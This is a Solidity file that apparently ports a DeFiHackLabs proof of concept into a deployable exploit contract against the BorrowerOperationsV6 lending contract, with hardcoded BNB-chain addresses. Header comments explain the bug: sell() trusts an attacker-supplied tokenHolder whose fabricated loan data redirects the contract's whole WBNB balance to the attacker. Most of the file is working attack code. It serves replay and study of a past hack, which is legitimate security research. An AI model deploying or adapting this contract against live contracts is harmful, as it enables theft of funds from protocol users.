// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// SYNTHETIC exploit for the EVM Playground — a standalone deployable version of DeFiHackLabs'
// TokenHolder_exp.sol ExploitTemplate (the Foundry test IS the attacker, address(this) implements the
// callback interface inline). Ported almost verbatim: the test contract's loans()/repayLoan()/
// privilegedLoan() no-op callbacks become this contract's own functions, and testExploit()'s single
// borrowerOper.sell(...) call becomes run().
//
// Bug: BorrowerOperationsV6.sell(loanId, sellingCode, tokenHolder, inchRouter, integratorFeeAddress,
// whitelistedDex) lets the CALLER supply an arbitrary `tokenHolder` contract and blindly trusts its
// loans(loanId) return data with zero validation that the loan is real. The attacker's loans() fabricates
// a Loan with collateralAmount=0 and userPaid=0. Since userPaid=0, sell()'s later
// `profit = balance > userPaid ? balance - userPaid : 0` treats the contract's ENTIRE existing WETH/WBNB
// balance as "profit" belonging to the fabricated loan, and the final `weth.transfer(borrower, ...)` sends
// nearly all of it to `borrower` — which the fake Loan struct also sets to the attacker contract itself.
contract TokenHolderExploit {
    IBorrowerOperationsV6 public borrowerOper = IBorrowerOperationsV6(0x616B36265759517AF14300Ba1dD20762241a3828);
    address public WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public inchRouter = 0x2EeD3DC9c5134C056825b12388Ee9Be04E522173;

    function run() external {
        uint256 loanId = 0;
        bytes memory sellingCode = abi.encodeWithSignature("privilegedLoan(address,uint256)", WBNB, 20 ether);
        borrowerOper.sell(loanId, sellingCode, address(this), inchRouter, address(this), address(this));
    }

    // --- fabricated TokenHolder callback interface, trusted unchecked by sell() ---

    function loans(uint256) external view returns (Loan memory) {
        Collateral memory c = Collateral(WBNB, 0, 0, false, 0, 0, 0);
        return Loan(0, 0, c, 0, 0, address(this), 0);
    }

    function repayLoan(uint256, bool) external {}

    function privilegedLoan(address, uint256) external {}
}

struct Collateral {
    address collateralAddress;
    uint256 maxLendPerToken;
    uint256 interestRate;
    bool active;
    uint256 minAmount;
    uint256 maxExposure;
    uint256 currentExposure;
}

struct Loan {
    uint256 id;
    uint256 amount;
    Collateral collateral;
    uint256 collateralAmount;
    uint256 timestamp;
    address borrower;
    uint256 userPaid;
}

interface IBorrowerOperationsV6 {
    function sell(uint256 loanId, bytes calldata sellingCode, address tokenHolder, address inchRouter, address integratorFeeAddress, address whitelistedDex) external payable;
}
